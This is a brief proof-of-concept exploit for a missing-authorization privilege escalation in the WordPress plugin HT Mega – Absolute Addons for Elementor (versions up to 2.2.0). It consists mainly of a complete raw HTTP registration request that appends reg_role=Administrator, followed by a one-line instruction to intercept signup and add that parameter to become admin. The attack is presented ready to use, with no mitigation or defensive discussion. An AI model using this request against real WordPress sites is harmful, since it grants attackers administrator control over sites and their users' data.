# ht-mega
"HT Mega – Absolute Addons for Elementor &lt;= 2.2.0 - Missing Authorization to Privilege Escalation"

Requires registration to be enabled.

Proof of Concept
---
```
POST /my-account/ HTTP/2
Host: wordpress.lan
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 165
Origin: http://wordpress.lan
Referer: http://wordpress.lan/my-account/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=robbie@wordpress.lan&password=testest123%21&woocommerce-register-nonce=bfg37lz911&_wp_http_referer=%2Fmy-account%2F&register=Register&reg_role=Administrator
```

Intercept the registion and then just add `reg_role=Administrator` on the end and your now admin
